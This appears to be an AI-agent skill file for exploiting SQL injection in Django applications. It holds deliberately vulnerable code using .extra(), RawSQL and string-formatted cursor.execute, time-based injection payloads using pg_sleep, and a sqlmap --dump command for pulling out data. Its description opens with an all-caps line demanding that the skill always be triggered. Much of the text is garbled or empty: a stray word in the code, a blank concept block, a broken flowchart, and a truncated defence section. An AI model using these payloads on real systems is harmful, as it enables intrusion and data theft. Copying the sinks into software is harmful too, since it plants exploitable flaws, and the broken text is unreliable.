---
name: django-sql-injection
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit SQL Injection vulnerabilities in Django applications, specifically focusing 
  on edge cases involving raw querysets (`RawSQL`), improper use of `.extra()`, and poorly sanitized 
  filters where Django's typical ORM protections are bypassed.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190, T1059]
platforms: [web, python]
tags: [sql-injection, django, python, web-security, databases, bug-hunting]
tools: [burp-suite, sqlmap, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Django SQL Injection

## When to Use
- When auditing or penetration testing a web application built on the Django framework (often identifiable by specific session cookies, admin panels, or error pages).
- To exploit areas where developers have strayed from the safe, built-in ORM features and opted for raw SQL execution or complex, unsafe query annotations.

## Workflow

### Phase 1: Understanding Django ORM Limitations

```text
# Concept: ```

### Phase 2: Identifying Sinks (Code Review / Black Box)

```python
# Sink 1: The `.extra()` method VULNERABLE tastefully order_by = request.GET.get('order_by')
users = User.objects.extra(order_by=[order_by])

# Sink 2: RawSQL VULNERABLE from django.db.models.expressions import RawSQL
search = request.GET.get('search')
products = Product.objects.annotate(val=RawSQL(f"select count(*) from app_product where name = '{search}'", []))

# Sink 3: from django.db import connection
def custom_query(request):
    user_input = request.GET.get('username')
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users WHERE username = '%s'" % user_input) # VULNERABLE ```

### Phase 3: Exploitation

```http
# GET /products?order_by=-id%3B%20SELECT%20pg_sleep(10)-- HTTP/1.1
Host: django-app.local

# GET /search?search=' OR 1=1; SELECT pg_sleep(5);-- HTTP/1.1
```

### Phase 4: Data Exfiltration (Time-Based)

```bash
# sqlmap -u "http://target.com/products?order_by=id" -p order_by --technique=T --dbms=postgresql --dump
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Analyze Request ] --> B{ORMs Bypsassed ]}
    B -->|Yes| C[Test Error ]
    B -->|No| D[Test Raw ]
    C --> E[Exploit ]
```

## 🔵 Blue Team Detection & Defense
- **Strict ORM Usage**: **Input Validation**: Key Concepts
| Concept | Description |
|---------|-------------|
| Django ORM | |
| `.extra()` | |

## References
- Django Documentation: [Security in Django - SQL Injection](https://docs.djangoproject.com/en/stable/topics/security/#sql-injection-protection)
- PortSwigger: [SQL Injection](https://portswigger.net/web-security/sql-injection)
